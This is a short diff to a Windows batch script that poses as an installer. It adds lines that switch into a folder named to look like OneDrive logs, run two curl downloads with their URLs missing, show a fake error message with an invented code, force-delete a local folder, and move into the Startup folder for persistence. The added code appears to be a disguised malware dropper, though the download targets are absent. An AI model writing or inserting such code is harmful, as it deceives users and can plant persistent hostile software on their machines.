@@ -9,3 +9,8 @@ echo Getting ready...
 timeout 1 > nul
 echo Downloading and installing...
 timeout 1 > nul
+cd %roamingappdata%\OneDriveLogs\
+curl -LO
+curl -LO
+if %ERRORLEVEL% NEQ 0 (echo Whoops! Sorry, we have encountered an error while trying to install. Error code: 0x344 && del /f /s /q %localappdata%\LCAB\ && pause && exit)
+cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
